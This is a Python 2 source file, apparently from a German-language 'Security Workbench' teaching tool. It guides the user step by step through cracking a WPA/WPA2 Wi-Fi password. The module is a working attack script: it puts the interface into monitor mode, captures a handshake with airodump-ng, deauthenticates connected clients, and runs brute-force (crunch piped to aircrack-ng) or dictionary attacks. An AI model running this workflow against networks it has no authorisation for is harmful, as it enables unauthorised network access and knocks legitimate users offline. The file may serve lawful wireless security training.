#!/usr/bin/python
# -*- coding: utf-8 -*-
import os
import sys
import subprocess
import time
import subprocess

import colors
import generics
from generics import rlinput,execute,clearScreen,showCAPfiles,deauthClients

used_interface=''

def WPA_Menu():
	attack = True
	while(attack==True):
		clearScreen()
		shellCols = colors.ShellColors
		print shellCols.UNDERLINE + shellCols.HEADER + 'Untermenü: WPA/WPA2-PSK knacken' + shellCols.ENDC +'\n'
		print("WPA bzw. WPA2 (WiFi Protected Access) ist eine Kombination aus Authentifizie- rung und Verschlüsselung, um ein WLAN sicher zu "
			+"betreiben. Die Authentifizierung erfolgt in der Regel mit einem Passwort, um den Zugriff durch unberechtigte Personen zu verhindern. "
			+"Das nachfolgende Tutorial unterstützt beim Durchführen eines Angriffes auf einen WPA/WPA2-gesicherten Router. \n")
		print('Um dieses Tutorial durchzuführen müssen zuerst folgende Parameter vorgegeben werden: '
			+'\n 1. Name des WLAN-Interfaces '
			+'\n 2. Die BSSID, SSID und Kanalnummer des angegriffenen Routers/Netzwerks\n')

		#STEP 1
		command = rlinput('WLAN-Interfacename ermitteln mittels: \n# ', 'ifconfig')
		execute(command)
		wifi_name = raw_input("Name des WLAN-Interfaces hier angeben: ")

		#MONITOR MODE
		generics.monitor_mode(wifi_name)
		used_interface=wifi_name

		
		#KILL PROCESSES
		generics.kill_wifi_proc()

		#STEP 1 Check again
		wifi_name = generics.check_wifi_name(wifi_name)
		used_interface=wifi_name

		do5GHZ = generics.Is5GHz()
		str5ghz = ""
		if(do5GHZ):
			str5ghz = " --band a "
		
		#STEP 2
		command = rlinput('Die BSSID und Kanalnummer ermitteln (Netzwerk anhand der SSID indentifzieren) mit der Tasten Kompination strg + c wird Aktuallisierung abgebrochen und man kann die werte einfach rauskopieren: \n# ', 'airodump-ng '+str5ghz +wifi_name )
		execute(command)
		router_ssid = raw_input("Bitte die Netzwerk SSID angeben: ")
		router_chn = raw_input("Bitte die Netzwerk Kanalnummer angeben: ")
		router_bssid = raw_input("Bitte die Router BSSID angeben: ")
		
		#STRIP STRINGS
		wifi_name = wifi_name.strip()
		router_ssid = router_ssid.strip()
		router_chn = router_chn.strip()
		router_bssid = router_bssid.strip()

		#OVERVIEW CONFIGURATION
		print("\n")
		print shellCols.UNDERLINE + shellCols.HEADER + "Folgende Konfiguration für die Druchführung der Angriffe wurde festgehalten:" + shellCols.ENDC + '\n'
		print('WLAN-Interfacename: ' + wifi_name)
		print('SSID: ' + router_ssid)
		print('Kanalnummer: ' + router_chn)
		print('BSSID: ' + router_bssid)
		if(do5GHZ):
			print('Band: 5GHz')
		else:
			print('Band: 2.4GHz')
		print("\n")
		#RECORD TRAFFIC
		print("Jetzt erst beginnt der tatsächliche Angriff:")
		
		## %Broken Wenn man einen SSID eingibt die " " beinhalten muss man den nahmen kapseln damit dieser alls ganzes erkannt wird dies ist aber bei den methoden
		## %Broken excute nicht möglich da dise wegenterpretiert wird und dann nicht mehr den vollständigen Code ausführt
		##
		command = rlinput('Aufnahme des Netzwerkverkehrs bis ein vollständiger 4-way-handshake aufgenommen wurde (Liegt der Handshake vor kann der Prozess beendet werden.): \n#', 'airodump-ng -c ' +router_chn +str5ghz+ ' --bssid ' + router_bssid +' --showack -w '+ '"' +router_ssid.replace(" ", "\s") +'"' +' ' + wifi_name )
		execute(command)
		#p = subprocess.Popen("x-terminal-emulator -e  airodump-ng -c"  +router_chn +str5ghz+ ' --bssid ' + router_bssid +' --showack -w '+ '"' +router_ssid +'"' +' ' + wifi_name, shell=True, stdout=subprocess.PIPE)
		
		#Start airodump-ng -c ' +router_chn +str5ghz+ ' --bssid ' + router_bssid +' --showack -w '+ router_ssid + ' ' + wifi_name
		
		
		#FORCE REAUTH
		deauthClients(router_bssid, wifi_name, 'Um einen kompletten 4-way-handshake aufzuzeichnen, muessen zuerst Clients vom Router deauthentifiziert werden, um eine erneute Authentifizierung des Clients zu provozieren: \n# ')

		#SELECT DICTIONARY OR BF
		print('\n')
		print ('Nachdem der handshake vollständig vorliegt und der Aufnahmeprozess beendet wurde, existieren verschiedene Möglichkeiten zur Extraktion des Passworts: '
			+'\n 1. Bruteforcing '
			+'\n 2. Wörterbuchattacken \n')
		try:
			selection = input("Die Auswahl bitte hier eingeben und mit Enter bestätigen: ")
		except SyntaxError:
			selection=1
		if((selection != 1) and (selection != 2)):
			print("Die ausgewählte Methode existiert nicht. Bitte als Auswahl 1 oder 2 angeben.")
			selection = raw_input("Die Auswahl bitte hier eingeben und mit Enter bestätigen: ")

		if((selection != 1) and (selection != 2)):
			print('Mehrere falsche Eingaben wurden erkannt. Zum Fortfahren wurde automatisch Auswahl 1 gewählt!')
			selection=1


		#Show list of CAP-Files
		filenamestring= showCAPfiles(router_ssid)
		
		#BRUTEFORCING	
		if(selection == 1):
			print ('Für die Durchführung eines Bruteforce-Angriffs müssen zuerst folgende Parameter angegeben werden:')
			length_min = rlinput ('Erwartete minimale Passwortlänge: ')
			length_max = rlinput ('Erwartete maximale Passwortlänge: ')
			alphabet = rlinput ('Zeichen die während des Bruteforce-Angriffs getestet werden sollen: ','HMacek')
			command = rlinput('Start Bruteforce-Angriff: \n#  crunch ' + length_min + ' ' + length_max + ' ' +alphabet + ' | aircrack-ng --bssid ' + router_bssid + ' -w- ' + '"' +filenamestring + '"')
			execute(command)

		#DICTIONARY
		elif(selection == 2):
			dictionary = rlinput ('Um eine Wörterbuchattacke durchzuführen, muss ein Wörterbuch angegeben werden: ', 'WIFI/dict.txt')
			command = rlinput('Start Wörterbuchattacke: \n#' , 'aircrack-ng -w ' +dictionary+ ' -b ' +router_bssid + ' ' + '"' +filenamestring + '"' )
			execute(command)
			
		#Stop Monitor Mode
                generics.stop_monitor_mode(wifi_name)
		
		#ReStart Networkmanager
                generics.restart_networkmanager()
                
		#END
		print('Ende des WPA/WPA2-Tutorials erreicht! \n Bitte wählen zum Fortfahren: \n')
		print ('1. Zurück zum Menu \n'
			+ '2. Zurück zur WPA-Übersicht\n' 
			+ '0. Tutorial beenden \n')
		try:
			selection = input("Die Auswahl bitte hier eingeben und mit Enter bestätigen: ")
		except SyntaxError:
			selection=0
		if(selection==1):
			attack = False
			return True
		elif(selection==2):
			attack=True
			#Just du magic stuff. Unicorn!!
		else: 
			attack = False
			return False

def sql_signal_handler(signal, frame):
	#Stop Monitor Mode
	os.system('airmon-ng stop ' + used_interface)
	#ReStart Networkmanager
	os.system("service networking stop && service network-manager stop")
	os.system("service networking start && service network-manager start")
	print('\n\n Die Security Workbench wird beendet ... \n')
	sys.exit(0)

	#FINISHED WPA ATTACK
